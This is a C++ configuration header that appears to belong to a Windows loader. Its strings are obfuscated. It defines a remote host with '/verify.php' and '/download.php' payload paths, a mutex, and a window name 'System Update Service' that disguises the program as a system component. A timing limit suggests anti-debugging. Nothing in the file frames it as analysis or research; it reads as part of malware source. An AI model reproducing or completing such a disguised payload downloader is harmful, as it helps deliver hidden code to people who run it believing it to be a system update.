#pragma once
#include "obfuscation.hpp"

#define CFG_HOST            WOBF(L"api.swiftfly.xyz")
#define CFG_AUTH_PATH       WOBF(L"/verify.php")
#define CFG_PAYLOAD_PATH    WOBF(L"/download.php")
#define CFG_PORT            443

#define CFG_MUTEX_NAME      WOBF(L"Local\\{A3F8C2D1-4E7B-49A0-B5C3-D2E1F6A8B9C0}")

#define CFG_WINDOW_TITLE    WOBF(L"System Update Service")
#define CFG_WINDOW_CLASS    WOBF(L"SystemSvc")

#define CFG_TIMING_LIMIT    3'000'000ULL

#define CFG_EXPECTED_HASH { \
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  \
}
